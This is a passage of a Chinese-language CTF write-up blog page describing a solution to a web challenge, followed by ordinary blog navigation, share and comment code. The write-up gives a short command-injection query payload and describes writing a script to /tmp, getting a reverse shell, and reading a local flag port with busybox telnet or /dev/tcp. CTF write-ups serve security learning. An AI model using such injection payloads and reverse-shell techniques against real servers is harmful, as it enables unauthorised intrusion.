+<p>但太容易超過長度30，就放棄了</p>
+<p>我後來的解法是: <code>?%E2%81%A3=`$_`;//;a=sle;b=ep;$a$b 10;</code></p>
+<p><code>`$_`;//;</code>後面可以接指令</p>
+<p>然後把shell script用類似HITCON CTF 2017 Babyfirst的技巧寫進<code>/tmp</code></p>
+<p>再把Reverse shell噴回來</p>
+<p>但噴回來還有個坑XD</p>
+<p>他沒有<code>nc</code>, <code>curl</code>, <code>wget</code>, <code>telnet</code>…等指令</p>
+<p>要怎麼去讀localhost:8888 ?</p>
+<p>後來我發現他有<code>busybox</code>，裏頭有<code>telnet</code>可以用</p>
+<p>所以<code>busybox telnet localhost 8888</code>就讀出FLAG惹</p>
+<p>其他人還有用<code>cat &lt; /dev/tcp/0/8888</code>或<code>ssh -v 0 8888</code>的</p>
+<p>更多解法可以看writeup: <a href="https://github.com/l4wio/CTF-challenges-by-me/tree/master/lixi_2018/writeup" target="_blank" rel="external">https://github.com/l4wio/CTF-challenges-by-me/tree/master/lixi_2018/writeup</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/08/20/DEFCON-26-Final-CTF初體驗/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          DEFCON 26 Final CTF初體驗
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/16/AIS3-EOF-2017-初賽/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">AIS3 EOF CTF 初賽</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2022 KaiBro
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.1.6/require.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-61797645-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+  </div>
+</body>
+</html>
